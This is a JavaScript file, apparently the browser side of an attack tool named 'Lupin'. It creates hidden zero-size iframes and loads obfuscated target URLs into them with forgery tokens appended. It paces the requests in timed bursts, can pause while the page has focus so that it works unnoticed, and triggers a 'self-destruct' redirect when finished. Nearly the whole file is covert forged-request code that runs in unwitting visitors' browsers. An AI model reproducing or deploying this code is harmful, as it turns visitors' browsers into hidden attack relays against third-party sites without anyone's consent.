
var targetsChecked	= 0;
var numSlaves		= 10;
var targetIndex		= new Array(numSlaves);
var halt    		= false;
var burstStartTime  = 0;         
	 
function deobfuscate(string)
{
	var nums = string.split(".")
	var deobfs = "";
	var k;
           
	for (i=0; i<nums.length; i+=1)
	{
		k = parseInt(nums[i])-255;
        deobfs+=String.fromCharCode(k);
	}
	return deobfs;
}


function nextTarget(slaveFrameNum)
{

	var slaveFrameName = "slaveFrame"+slaveFrameNum.toString();
	var slaveFrame= document.getElementsByName(slaveFrameName)[0]; 
	var src = targets[targetIndex[slaveFrameNum]];
 	
	if(halt){ 
	    return;
	}
	
	targetIndex[slaveFrameNum] +=numSlaves;	
	if(targetsObfuscated){
		src = deobfuscate(src)
	}

	slaveFrame.setAttribute("src", "http://"+src+'?'+_LUPIN_TOKEN+_FORGERY);
}


function createSlaveFrame(slaveFrameNum)
{ 
	var slaveFrame = document.createElement("IFRAME"); 
	slaveFrame.setAttribute("height", "0");
	slaveFrame.setAttribute("width", "0");
	slaveFrame.setAttribute('style', 'visibility:hidden;display:none');
	slaveFrame.setAttribute("id", "slaveFrame"+slaveFrameNum.toString());
	slaveFrame.setAttribute("name", "slaveFrame"+slaveFrameNum.toString());
	document.body.appendChild(slaveFrame); 
} 

/*
function isLupinDown()
{
	var slaveFrameName = "slaveFrame0";
	var slaveFrame = document.getElementsByName(slaveFrameName)[0]; 
	slaveFrame.setAttribute('src', document.location.hostname+'?'+_LUPIN_TOKEN+_FORGERY);
}
*/



function wakeSlaves()
{

	if(nibble == false)
	{
		if(halt){ 
			return; 
		}
	}

	var lastBurst = burstStartTime;
    var d = new Date();
	burstStartTime = d.getTime();
	if (burstStartTime - lastBurst < sleepDuration){
	    return;
	}
	
	alert(targetsChecked);
	
	/*
	if(isLupinDown())
	{
		initiateSelfDestruct()
		return;
	}
	*/
	
	for(var i=0; i<numSlaves;i++)
	{ 
		if(targetIndex[i] < targets.length){	
			nextTarget(i);
		}
	}	
}

           
function onMessage (event)
{
	var slaveFrameName = event.data;
	
	if(slaveFrameName.indexOf("focus") != -1)
	{
		if(runWhileInFocus == false){
		    halt = true;
		}    
		return;
	}
	    
		
	if(slaveFrameName.indexOf("blur") != -1)
	{
	
	    if(runWhileInFocus == false)
	    {
	        halt = false;
		    if(sleepDuration < 10000){
	    	    setTimeout("wakeSlaves()", 10000);
		    }else{
		    	setTimeout("wakeSlaves()", sleepDuration);
	    	}
	    }
	    return;
	}
	

	targetsChecked += 1;

	if(targetsChecked == targets.length )
	{
		document.location.replace(document.location.hostname+"?"+_LUPIN_TOKEN+_DESTRUCT);      
		return;
	}

	var slaveFrameNum = parseInt(slaveFrameName.substring(10));

	if(halt == true || targetIndex[slaveFrameNum] >= targets.length){
		return;
	}
	
    var d = new Date();
   	if(d.getTime() - burstStartTime  < burstDuration){
	    nextTarget(slaveFrameNum);	    
	}else
	{
		if(nibble == true){
		    nibble = false;
		}else{
		    setTimeout("wakeSlaves()", sleepDuration);     
	    }   
	 }
	

}   	

/*
function initiateSelfDestruct(){
	window.parent.postMessage("selfDestruct",'*');
}
*/


function init()
{

    for(var i=0; i<numSlaves;i++)
    { 
    	targetIndex[i] = i; 
    	createSlaveFrame(i); 
    }
    
    if(runWhileInFocus == true || nibble == true){
        wakeSlaves();
    }
	
	window.addEventListener ("message", onMessage, false);
}




